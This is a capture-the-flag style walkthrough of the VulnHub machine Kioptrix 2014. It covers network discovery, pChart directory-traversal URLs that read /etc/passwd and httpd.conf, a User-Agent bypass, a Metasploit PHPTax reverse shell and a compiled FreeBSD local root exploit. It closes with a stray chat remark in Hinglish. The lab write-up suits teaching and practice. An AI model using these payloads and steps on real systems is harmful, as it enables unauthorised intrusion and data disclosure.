# -Kioptrix-2014-Walkthrough
Kioptrix 2014 is a vulnerable FreeBSD-based machine from VulnHub. The objective of this assessment was to gain root access through enumeration, web exploitation, and privilege escalation.

---

## 🎯 Target Discovery

The first step was to identify the target machine on the local network using Netdiscover.

```bash
sudo netdiscover

📸 Screenshot: netdiscover.png

The target machine was discovered at:

192.168.0.123
🔍 Port Enumeration

After identifying the target IP address, an aggressive Nmap scan was performed to enumerate open ports, running services, and version information.

nmap -A 192.168.0.123

📸 Screenshot: nmap-scan.png

Open Ports
Port	Service
22	SSH
80	HTTP
8080	HTTP

The presence of two web services made web enumeration the primary focus.

🌐 Web Enumeration

Accessing port 8080 returned a 403 Forbidden response.

📸 Screenshot: 403-forbidden.png

While reviewing the page source code, a reference to pChart 2.1.3 was discovered.

📸 Screenshot: page-source.png

Research revealed that pChart 2.1.3 contains a Directory Traversal vulnerability.

💥 Exploiting pChart

The following payload was used to read local files from the target system:

http://192.168.0.123/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd

📸 Screenshot: pchart-traversal.png

The vulnerability was then leveraged to access the Apache configuration file:

http://192.168.0.123/pChart2.1.3/examples/index.php?Action=View&Script=/../../usr/local/etc/apache22/httpd.conf

📸 Screenshot: apache-config.png

Reviewing the configuration revealed that access was restricted based on the User-Agent header.

🕷️ Bypassing the User-Agent Restriction

To verify the restriction, the request was intercepted using Burp Suite.

The original request contained:

User-Agent: Mozilla/5.0

📸 Screenshot: burp-capture.png

The User-Agent header was modified to:

User-Agent: Mozilla/4.0

📸 Screenshot: burp-modified.png

After forwarding the modified request, access to the restricted application was granted.

📸 Screenshot: phptax-access.png

🚀 Initial Access

A known vulnerability affecting PHPTax was identified and exploited using Metasploit.

msfconsole
search phptax

📸 Screenshot: msf-search.png

After configuring the exploit and specifying the required User-Agent, a reverse shell was obtained.

📸 Screenshot: exploit-options.png

📸 Screenshot: reverse-shell.png

Verifying access:

whoami

Output:

www
⬆️ Privilege Escalation

System enumeration identified the target operating system as FreeBSD.

uname -a

📸 Screenshot: uname-output.png

A suitable local privilege escalation exploit was identified using Searchsploit.

searchsploit freebsd local

📸 Screenshot: searchsploit-result.png

The exploit was copied, transferred, compiled, and executed.

gcc 28718.c -o ex
chmod +x ex
./ex

📸 Screenshot: exploit-transfer.png

📸 Screenshot: gcc-compile.png

📸 Screenshot: exploit-execution.png

👑 Root Access

After executing the exploit:

whoami

Output:

root

📸 Screenshot: root-shell.png

🎉 The objective of the machine was successfully completed.

🏁 Conclusion

This machine provided hands-on experience with:

✅ Network Enumeration
✅ Directory Traversal
✅ Configuration Disclosure
✅ User-Agent Bypass
✅ Remote Code Execution
✅ FreeBSD Privilege Escalation

Kioptrix 2014 is an excellent lab for practicing web exploitation and privilege escalation techniques in a controlled environment.


Ye balance perfect hai bhai — **professional + attractive + GitHub portfolio worthy**. 🔥👨‍💻💀
